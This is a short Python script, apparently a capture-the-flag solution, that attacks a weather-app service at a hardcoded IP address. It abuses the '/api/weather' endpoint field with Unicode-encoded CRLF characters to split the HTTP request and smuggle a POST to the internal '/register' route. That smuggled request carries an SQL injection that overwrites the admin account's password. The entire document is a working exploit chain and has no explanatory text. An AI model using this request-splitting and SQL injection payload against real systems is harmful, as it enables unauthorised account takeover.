import requests

url = "http://209.97.133.52:31579"

username="admin"

password="123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"
parsedUsername = username.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
parsedPassword = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(parsedUsername) + len(parsedPassword) + 19
endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str (contentLength) + '\u010D\u010A\u010D\u010Ausername='+parsedUsername + '&password='+ parsedPassword + '\u010D\u010A\u010D\u010AGET\u0120/?lol='

city='test'

country='test'

json={'endpoint':endpoint,'city':city,'country':country}

res=requests.post(url=url+'/api/weather',json=json)
